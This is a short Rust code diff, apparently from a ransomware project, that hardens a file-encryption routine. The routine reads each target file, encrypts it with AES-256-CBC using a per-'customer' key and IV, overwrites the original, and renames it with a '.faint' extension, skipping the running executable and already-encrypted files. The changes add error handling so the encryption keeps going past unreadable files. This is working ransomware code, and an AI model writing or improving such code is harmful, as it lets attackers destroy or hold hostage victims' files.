@@ -34,8 +34,12 @@ pub fn get_id() -> Customer {
 }
 
 pub fn extensions(file: &path::Path) -> bool {
-    let extension = file.extension().unwrap().to_str().unwrap();
-    matches!(extension, "faint" | "ini")
+    if let Some(extension) = file.extension() {
+        let extension = extension.to_str().unwrap();
+        matches!(extension, "faint" | "ini")
+    } else {
+        false
+    }
 }
 
 pub fn encrypt(file: &path::PathBuf, customer: &Customer) {
@@ -43,10 +47,14 @@ pub fn encrypt(file: &path::PathBuf, customer: &Customer) {
         && !extensions(file)
         && file.file_name() != env::current_exe().unwrap().file_name()
     {
-        let file_content = fs::read(file).unwrap();
-        let cipher = libaes::Cipher::new_256(customer.keypair.key.as_bytes().try_into().unwrap());
-        let encrypted = cipher.cbc_encrypt(customer.keypair.iv.as_bytes(), &file_content);
-        fs::write(file, encrypted).unwrap();
-        fs::rename(file, format!("{}.faint", file.display())).unwrap();
+        println!("{}", file.display());
+        if let Ok(file_content) = fs::read(file) {
+            let cipher =
+                libaes::Cipher::new_256(customer.keypair.key.as_bytes().try_into().unwrap());
+            let encrypted = cipher.cbc_encrypt(customer.keypair.iv.as_bytes(), &file_content);
+            if let Ok(_) = fs::write(file, encrypted) {
+                fs::rename(file, format!("{}.faint", file.display())).unwrap();
+            }
+        }
     }
 }
